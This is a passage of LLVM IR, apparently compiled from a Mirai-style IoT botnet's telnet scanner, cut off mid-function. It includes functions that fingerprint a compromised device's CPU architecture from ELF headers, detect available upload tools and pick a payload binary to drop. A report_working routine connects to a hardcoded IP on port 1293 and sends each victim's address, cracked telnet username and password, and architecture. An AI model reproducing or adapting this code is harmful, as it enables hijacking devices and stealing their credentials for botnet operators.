; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @consume_resp_prompt(%struct.scanner_connection* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  call void @table_unlock_val(i8 zeroext 12)
  %7 = call i8* @table_retrieve_val(i32 12, i32* %6)
  store i8* %7, i8** %4, align 8
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [8192 x i8], [8192 x i8]* %9, i64 0, i64 0
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 4
  %13 = load i32, i32* %12, align 8
  %14 = load i8*, i8** %4, align 8
  %15 = load i32, i32* %6, align 4
  %16 = sub nsw i32 %15, 1
  %17 = call i32 @util_memsearch(i8* %10, i32 %13, i8* %14, i32 %16)
  store i32 %17, i32* %5, align 4
  %18 = load i32, i32* %5, align 4
  %19 = icmp eq i32 %18, -1
  br i1 %19, label %20, label %21

20:                                               ; preds = %1
  call void @table_lock_val(i8 zeroext 12)
  store i32 0, i32* %2, align 4
  br label %23

21:                                               ; preds = %1
  call void @table_lock_val(i8 zeroext 12)
  %22 = load i32, i32* %5, align 4
  store i32 %22, i32* %2, align 4
  br label %23

23:                                               ; preds = %21, %20
  %24 = load i32, i32* %2, align 4
  ret i32 %24
}

; Function Attrs: nounwind readonly willreturn
declare i32 @strcmp(i8*, i8*) #8

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @parse_elf_response(%struct.scanner_connection* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 0, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.131, i64 0, i64 0), i8** %6, align 8
  store i32 0, i32* %4, align 4
  br label %9

9:                                                ; preds = %36, %1
  %10 = load i32, i32* %4, align 4
  %11 = icmp slt i32 %10, 8192
  br i1 %11, label %12, label %39

12:                                               ; preds = %9
  %13 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %14 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %13, i32 0, i32 7
  %15 = load i32, i32* %4, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds [8192 x i8], [8192 x i8]* %14, i64 0, i64 %16
  %18 = load i8, i8* %17, align 1
  %19 = sext i8 %18 to i32
  %20 = load i8*, i8** %6, align 8
  %21 = load i32, i32* %5, align 4
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds i8, i8* %20, i64 %22
  %24 = load i8, i8* %23, align 1
  %25 = sext i8 %24 to i32
  %26 = icmp eq i32 %19, %25
  br i1 %26, label %27, label %34

27:                                               ; preds = %12
  %28 = load i32, i32* %5, align 4
  %29 = add nsw i32 %28, 1
  store i32 %29, i32* %5, align 4
  %30 = icmp eq i32 %29, 4
  br i1 %30, label %31, label %33

31:                                               ; preds = %27
  %32 = load i32, i32* %4, align 4
  store i32 %32, i32* %5, align 4
  br label %39

33:                                               ; preds = %27
  br label %35

34:                                               ; preds = %12
  store i32 0, i32* %5, align 4
  br label %35

35:                                               ; preds = %34, %33
  br label %36

36:                                               ; preds = %35
  %37 = load i32, i32* %4, align 4
  %38 = add nsw i32 %37, 1
  store i32 %38, i32* %4, align 4
  br label %9, !llvm.loop !23

39:                                               ; preds = %31, %9
  %40 = load i32, i32* %5, align 4
  %41 = icmp ne i32 %40, 0
  br i1 %41, label %43, label %42

42:                                               ; preds = %39
  store i32 0, i32* %2, align 4
  br label %171

43:                                               ; preds = %39
  %44 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %45 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %44, i32 0, i32 7
  %46 = load i32, i32* %5, align 4
  %47 = add nsw i32 %46, 2
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds [8192 x i8], [8192 x i8]* %45, i64 0, i64 %48
  %50 = load i8, i8* %49, align 1
  %51 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %52 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %51, i32 0, i32 11
  store i8 %50, i8* %52, align 2
  %53 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %54 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %53, i32 0, i32 7
  %55 = load i32, i32* %5, align 4
  %56 = add nsw i32 %55, 15
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds [8192 x i8], [8192 x i8]* %54, i64 0, i64 %57
  %59 = load i8, i8* %58, align 1
  %60 = sext i8 %59 to i16
  %61 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %62 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %61, i32 0, i32 14
  store i16 %60, i16* %62, align 2
  %63 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %64 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %63, i32 0, i32 14
  %65 = load i16, i16* %64, align 2
  %66 = zext i16 %65 to i32
  %67 = icmp eq i32 %66, 65
  br i1 %67, label %68, label %71

68:                                               ; preds = %43
  %69 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %70 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %69, i32 0, i32 14
  store i16 8, i16* %70, align 2
  br label %71

71:                                               ; preds = %68, %43
  %72 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %73 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %72, i32 0, i32 14
  %74 = load i16, i16* %73, align 2
  %75 = zext i16 %74 to i32
  %76 = icmp eq i32 %75, 0
  br i1 %76, label %83, label %77

77:                                               ; preds = %71
  %78 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %79 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %78, i32 0, i32 11
  %80 = load i8, i8* %79, align 2
  %81 = zext i8 %80 to i32
  %82 = icmp eq i32 %81, 0
  br i1 %82, label %83, label %84

83:                                               ; preds = %77, %71
  store i32 -1, i32* %2, align 4
  br label %171

84:                                               ; preds = %77
  %85 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %86 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %85, i32 0, i32 14
  %87 = load i16, i16* %86, align 2
  %88 = zext i16 %87 to i32
  %89 = icmp eq i32 %88, 40
  br i1 %89, label %90, label %91

90:                                               ; preds = %84
  store i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.108, i64 0, i64 0), i8** %7, align 8
  br label %164

91:                                               ; preds = %84
  %92 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %93 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %92, i32 0, i32 14
  %94 = load i16, i16* %93, align 2
  %95 = zext i16 %94 to i32
  %96 = icmp eq i32 %95, 183
  br i1 %96, label %97, label %98

97:                                               ; preds = %91
  store i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.132, i64 0, i64 0), i8** %7, align 8
  br label %163

98:                                               ; preds = %91
  %99 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %100 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %99, i32 0, i32 14
  %101 = load i16, i16* %100, align 2
  %102 = zext i16 %101 to i32
  %103 = icmp eq i32 %102, 62
  br i1 %103, label %104, label %105

104:                                              ; preds = %98
  store i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.133, i64 0, i64 0), i8** %7, align 8
  br label %162

105:                                              ; preds = %98
  %106 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %107 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %106, i32 0, i32 14
  %108 = load i16, i16* %107, align 2
  %109 = zext i16 %108 to i32
  %110 = icmp eq i32 %109, 8
  br i1 %110, label %111, label %117

111:                                              ; preds = %105
  %112 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %113 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %112, i32 0, i32 11
  %114 = load i8, i8* %113, align 2
  %115 = zext i8 %114 to i32
  %116 = icmp eq i32 %115, 2
  br i1 %116, label %129, label %117

117:                                              ; preds = %111, %105
  %118 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %119 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %118, i32 0, i32 14
  %120 = load i16, i16* %119, align 2
  %121 = zext i16 %120 to i32
  %122 = icmp eq i32 %121, 10
  br i1 %122, label %123, label %132

123:                                              ; preds = %117
  %124 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %125 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %124, i32 0, i32 11
  %126 = load i8, i8* %125, align 2
  %127 = zext i8 %126 to i32
  %128 = icmp eq i32 %127, 2
  br i1 %128, label %129, label %132

129:                                              ; preds = %123, %111
  %130 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %131 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %130, i32 0, i32 14
  store i16 8, i16* %131, align 2
  store i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.134, i64 0, i64 0), i8** %7, align 8
  br label %161

132:                                              ; preds = %123, %117
  %133 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %134 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %133, i32 0, i32 14
  %135 = load i16, i16* %134, align 2
  %136 = zext i16 %135 to i32
  %137 = icmp eq i32 %136, 8
  br i1 %137, label %138, label %144

138:                                              ; preds = %132
  %139 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %140 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %139, i32 0, i32 11
  %141 = load i8, i8* %140, align 2
  %142 = zext i8 %141 to i32
  %143 = icmp eq i32 %142, 1
  br i1 %143, label %156, label %144

144:                                              ; preds = %138, %132
  %145 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %146 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %145, i32 0, i32 14
  %147 = load i16, i16* %146, align 2
  %148 = zext i16 %147 to i32
  %149 = icmp eq i32 %148, 10
  br i1 %149, label %150, label %159

150:                                              ; preds = %144
  %151 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %152 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %151, i32 0, i32 11
  %153 = load i8, i8* %152, align 2
  %154 = zext i8 %153 to i32
  %155 = icmp eq i32 %154, 1
  br i1 %155, label %156, label %159

156:                                              ; preds = %150, %138
  %157 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %158 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %157, i32 0, i32 14
  store i16 8, i16* %158, align 2
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.135, i64 0, i64 0), i8** %7, align 8
  br label %160

159:                                              ; preds = %150, %144
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.116, i64 0, i64 0), i8** %7, align 8
  br label %160

160:                                              ; preds = %159, %156
  br label %161

161:                                              ; preds = %160, %129
  br label %162

162:                                              ; preds = %161, %104
  br label %163

163:                                              ; preds = %162, %97
  br label %164

164:                                              ; preds = %163, %90
  %165 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %166 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %165, i32 0, i32 8
  %167 = getelementptr inbounds [16 x i8], [16 x i8]* %166, i64 0, i64 0
  %168 = load i8*, i8** %7, align 8
  %169 = call i8* @strcpy(i8* %167, i8* %168) #9
  %170 = load i32, i32* %5, align 4
  store i32 %170, i32* %2, align 4
  br label %171

171:                                              ; preds = %164, %83, %42
  %172 = load i32, i32* %2, align 4
  ret i32 %172
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @consume_arm_subtype(%struct.scanner_connection* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  call void @table_unlock_val(i8 zeroext 12)
  %7 = call i8* @table_retrieve_val(i32 12, i32* %6)
  store i8* %7, i8** %4, align 8
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [8192 x i8], [8192 x i8]* %9, i64 0, i64 0
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 4
  %13 = load i32, i32* %12, align 8
  %14 = load i8*, i8** %4, align 8
  %15 = load i32, i32* %6, align 4
  %16 = sub nsw i32 %15, 1
  %17 = call i32 @util_memsearch(i8* %10, i32 %13, i8* %14, i32 %16)
  store i32 %17, i32* %5, align 4
  call void @table_lock_val(i8 zeroext 12)
  %18 = load i32, i32* %5, align 4
  %19 = icmp eq i32 %18, -1
  br i1 %19, label %20, label %21

20:                                               ; preds = %1
  store i32 0, i32* %2, align 4
  br label %51

21:                                               ; preds = %1
  %22 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %23 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %22, i32 0, i32 7
  %24 = getelementptr inbounds [8192 x i8], [8192 x i8]* %23, i64 0, i64 0
  %25 = load i32, i32* %5, align 4
  %26 = sub nsw i32 %25, 1
  %27 = call i32 @util_memsearch(i8* %24, i32 %26, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.136, i64 0, i64 0), i32 5)
  %28 = icmp ne i32 %27, -1
  br i1 %28, label %37, label %29

29:                                               ; preds = %21
  %30 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %31 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %30, i32 0, i32 7
  %32 = getelementptr inbounds [8192 x i8], [8192 x i8]* %31, i64 0, i64 0
  %33 = load i32, i32* %5, align 4
  %34 = sub nsw i32 %33, 1
  %35 = call i32 @util_memsearch(i8* %32, i32 %34, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.137, i64 0, i64 0), i32 5)
  %36 = icmp ne i32 %35, -1
  br i1 %36, label %37, label %44

37:                                               ; preds = %29, %21
  %38 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %39 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %38, i32 0, i32 8
  %40 = getelementptr inbounds [16 x i8], [16 x i8]* %39, i64 0, i64 0
  %41 = call i8* @strcpy(i8* %40, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.138, i64 0, i64 0)) #9
  %42 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %43 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %42, i32 0, i32 14
  store i16 41, i16* %43, align 2
  br label %49

44:                                               ; preds = %29
  %45 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %46 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %45, i32 0, i32 8
  %47 = getelementptr inbounds [16 x i8], [16 x i8]* %46, i64 0, i64 0
  %48 = call i8* @strcpy(i8* %47, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.109, i64 0, i64 0)) #9
  br label %49

49:                                               ; preds = %44, %37
  %50 = load i32, i32* %5, align 4
  store i32 %50, i32* %2, align 4
  br label %51

51:                                               ; preds = %49, %20
  %52 = load i32, i32* %2, align 4
  ret i32 %52
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal void @report_working(i32 %0, i32 %1, %struct.scanner_connection* %2, i32 %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca %struct.scanner_connection*, align 8
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca %struct.resolv_entries*, align 8
  %13 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %5, align 4
  store i32 %1, i32* %6, align 4
  store %struct.scanner_connection* %2, %struct.scanner_connection** %7, align 8
  store i32 %3, i32* %8, align 4
  %14 = call i32 @fork() #9
  store i32 %14, i32* %10, align 4
  store %struct.resolv_entries* null, %struct.resolv_entries** %12, align 8
  %15 = load i32, i32* %10, align 4
  %16 = icmp sgt i32 %15, 0
  br i1 %16, label %20, label %17

17:                                               ; preds = %4
  %18 = load i32, i32* %10, align 4
  %19 = icmp eq i32 %18, -1
  br i1 %19, label %20, label %21

20:                                               ; preds = %17, %4
  ret void

21:                                               ; preds = %17
  %22 = call i32 @socket(i32 2, i32 1, i32 0) #9
  store i32 %22, i32* %11, align 4
  %23 = icmp eq i32 %22, -1
  br i1 %23, label %24, label %25

24:                                               ; preds = %21
  call void @exit(i32 0) #10
  unreachable

25:                                               ; preds = %21
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %26, align 4
  %27 = call i32 @htonl(i32 -1335130672) #11
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %29 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %28, i32 0, i32 0
  store i32 %27, i32* %29, align 4
  %30 = call zeroext i16 @htons(i16 zeroext 1293) #11
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i32, i32* %11, align 4
  %33 = bitcast %union.__CONST_SOCKADDR_ARG* %13 to %struct.sockaddr**
  %34 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  store %struct.sockaddr* %34, %struct.sockaddr** %33, align 8
  %35 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %13, i32 0, i32 0
  %36 = load %struct.sockaddr*, %struct.sockaddr** %35, align 8
  %37 = call i32 @connect(i32 %32, %struct.sockaddr* %36, i32 16)
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %39, label %42

39:                                               ; preds = %25
  %40 = load i32, i32* %11, align 4
  %41 = call i32 @close(i32 %40)
  call void @exit(i32 0) #10
  unreachable

42:                                               ; preds = %25
  %43 = load i32, i32* %11, align 4
  %44 = load i32, i32* %5, align 4
  %45 = and i32 %44, 255
  %46 = load i32, i32* %5, align 4
  %47 = lshr i32 %46, 8
  %48 = and i32 %47, 255
  %49 = load i32, i32* %5, align 4
  %50 = lshr i32 %49, 16
  %51 = and i32 %50, 255
  %52 = load i32, i32* %5, align 4
  %53 = lshr i32 %52, 24
  %54 = and i32 %53, 255
  %55 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %56 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %55, i32 0, i32 0
  %57 = load %struct.scanner_auth*, %struct.scanner_auth** %56, align 8
  %58 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %57, i32 0, i32 0
  %59 = load i8*, i8** %58, align 8
  %60 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %61 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %60, i32 0, i32 0
  %62 = load %struct.scanner_auth*, %struct.scanner_auth** %61, align 8
  %63 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %62, i32 0, i32 1
  %64 = load i8*, i8** %63, align 8
  %65 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %66 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %65, i32 0, i32 8
  %67 = getelementptr inbounds [16 x i8], [16 x i8]* %66, i64 0, i64 0
  %68 = load i32, i32* %8, align 4
  %69 = icmp eq i32 %68, 1
  %70 = zext i1 %69 to i64
  %71 = select i1 %69, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.128, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.129, i64 0, i64 0)
  %72 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %73 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %72, i32 0, i32 1
  %74 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %73, i32 0, i32 1
  %75 = load i32, i32* %74, align 4
  %76 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %77 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %76, i32 0, i32 9
  %78 = load i8, i8* %77, align 4
  %79 = zext i8 %78 to i32
  %80 = call i32 (i32, i8*, ...) @fdsend(i32 %43, i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.127, i64 0, i64 0), i32 %45, i32 %48, i32 %51, i32 %54, i8* %59, i8* %64, i8* %67, i8* %71, i32 %75, i32 %79)
  %81 = load i32, i32* %11, align 4
  %82 = call i32 @close(i32 %81)
  call void @exit(i32 0) #10
  unreachable
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @connection_consume_upload_methods(%struct.scanner_connection* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  call void @table_unlock_val(i8 zeroext 12)
  %7 = call i8* @table_retrieve_val(i32 12, i32* %6)
  store i8* %7, i8** %4, align 8
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [8192 x i8], [8192 x i8]* %9, i64 0, i64 0
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 4
  %13 = load i32, i32* %12, align 8
  %14 = load i8*, i8** %4, align 8
  %15 = load i32, i32* %6, align 4
  %16 = sub nsw i32 %15, 1
  %17 = call i32 @util_memsearch(i8* %10, i32 %13, i8* %14, i32 %16)
  store i32 %17, i32* %5, align 4
  call void @table_lock_val(i8 zeroext 12)
  %18 = load i32, i32* %5, align 4
  %19 = icmp eq i32 %18, -1
  br i1 %19, label %20, label %21

20:                                               ; preds = %1
  store i32 0, i32* %2, align 4
  br label %52

21:                                               ; preds = %1
  %22 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %23 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %22, i32 0, i32 7
  %24 = getelementptr inbounds [8192 x i8], [8192 x i8]* %23, i64 0, i64 0
  %25 = load i32, i32* %5, align 4
  %26 = sub nsw i32 %25, 1
  %27 = call i32 @util_memsearch(i8* %24, i32 %26, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.148, i64 0, i64 0), i32 10)
  %28 = icmp ne i32 %27, -1
  br i1 %28, label %29, label %33

29:                                               ; preds = %21
  %30 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %31 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %30, i32 0, i32 1
  %32 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %31, i32 0, i32 1
  store i32 1, i32* %32, align 4
  br label %50

33:                                               ; preds = %21
  %34 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %35 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %34, i32 0, i32 7
  %36 = getelementptr inbounds [8192 x i8], [8192 x i8]* %35, i64 0, i64 0
  %37 = load i32, i32* %5, align 4
  %38 = sub nsw i32 %37, 1
  %39 = call i32 @util_memsearch(i8* %36, i32 %38, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.149, i64 0, i64 0), i32 10)
  %40 = icmp ne i32 %39, -1
  br i1 %40, label %41, label %45

41:                                               ; preds = %33
  %42 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %43 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %42, i32 0, i32 1
  %44 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %43, i32 0, i32 1
  store i32 2, i32* %44, align 4
  br label %49

45:                                               ; preds = %33
  %46 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %47 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %46, i32 0, i32 1
  %48 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %47, i32 0, i32 1
  store i32 0, i32* %48, align 4
  br label %49

49:                                               ; preds = %45, %41
  br label %50

50:                                               ; preds = %49, %29
  %51 = load i32, i32* %5, align 4
  store i32 %51, i32* %2, align 4
  br label %52

52:                                               ; preds = %50, %20
  %53 = load i32, i32* %2, align 4
  ret i32 %53
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal %struct.payload* @get_retrieve_binary(%struct.scanner_connection* %0) #0 {
  %2 = alloca %struct.payload*, align 8
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i32, align 4
  %5 = alloca %struct.payload*, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 0, i32* %4, align 4
  %6 = load i32, i32* %4, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [4 x %struct.payload], [4 x %struct.payload]* @payloads, i64 0, i64 %7
  store %struct.payload* %8, %struct.payload** %5, align 8
  br label %9

9:                                                ; preds = %38, %1
  %10 = load %struct.payload*, %struct.payload** %5, align 8
  %11 = icmp ne %struct.payload* %10, null
  br i1 %11, label %12, label %43

12:                                               ; preds = %9
  %13 = load i32, i32* %4, align 4
  %14 = icmp eq i32 %13, 4
  br i1 %14, label %15, label %16

15:                                               ; preds = %12
  br label %43

16:                                               ; preds = %12
  %17 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %18 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %17, i32 0, i32 11
  %19 = load i8, i8* %18, align 2
  %20 = zext i8 %19 to i32
  %21 = load %struct.payload*, %struct.payload** %5, align 8
  %22 = getelementptr inbounds %struct.payload, %struct.payload* %21, i32 0, i32 0
  %23 = load i8, i8* %22, align 8
  %24 = zext i8 %23 to i32
  %25 = icmp eq i32 %20, %24
  br i1 %25, label %26, label %38

26:                                               ; preds = %16
  %27 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %28 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %27, i32 0, i32 14
  %29 = load i16, i16* %28, align 2
  %30 = zext i16 %29 to i32
  %31 = load %struct.payload*, %struct.payload** %5, align 8
  %32 = getelementptr inbounds %struct.payload, %struct.payload* %31, i32 0, i32 1
  %33 = load i8, i8* %32, align 1
  %34 = zext i8 %33 to i32
  %35 = icmp eq i32 %30, %34
  br i1 %35, label %36, label %38

36:                                               ; preds = %26
  %37 = load %struct.payload*, %struct.payload** %5, align 8
  store %struct.payload* %37, %struct.payload** %2, align 8
  br label %44

38:                                               ; preds = %26, %16
  %39 = load %struct.payload*, %struct.payload** %5, align 8
  %40 = getelementptr inbounds %struct.payload, %struct.payload* %39, i32 1
  store %struct.payload* %40, %struct.payload** %5, align 8
  %41 = load i32, i32* %4, align 4
  %42 = add nsw i32 %41, 1
  store i32 %42, i32* %4, align 4
  br label %9, !llvm.loop !24

43:                                               ; preds = %15, %9
  store %struct.payload* null, %struct.payload** %2, align 8
  br label %44

44:                                               ; preds = %43, %36
  %45 = load %struct.payload*, %struct.payload** %2, align 8
  ret %struct.payload* %45
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal %struct.binary* @process_retrieve_binary(%struct.payload* %0) #0 {
  %2 = alloca %struct.payload*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.binary*, align 8
  %6 = alloca [5 x i8], align 1
  %7 = alloca i32, align 4
  %8 = alloca [256 x i8], align 16
  store %struct.payload* %0, %struct.payload** %2, align 8
  store i32 0, i32* %3, align 4
  store i32 0, i32* %4, align 4
  store i32 0, i32* %7, align 4
  %9 = getelementptr inbounds [256 x i8], [256 x i8]* %8, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %9, i8 0, i64 256, i1 false)
  %10 = load %struct.payload*, %struct.payload** %2, align 8
  %11 = getelementptr inbounds %struct.payload, %struct.payload* %10, i32 0, i32 3
  %12 = load i16, i16* %11, align 8
  %13 = zext i16 %12 to i32
  %14 = sdiv i32 %13, 64
  %15 = add nsw i32 %14, 1
  %16 = sext i32 %15 to i64
  %17 = call noalias align 16 i8* @calloc(i64 %16, i64 16) #9
  %18 = bitcast i8* %17 to %struct.binary*
  store %struct.binary* %18, %struct.binary** %5, align 8
  store i32 0, i32* %3, align 4
  br label %19

19:                                               ; preds = %35, %1
  %20 = load i32, i32* %3, align 4
  %21 = load %struct.payload*, %struct.payload** %2, align 8
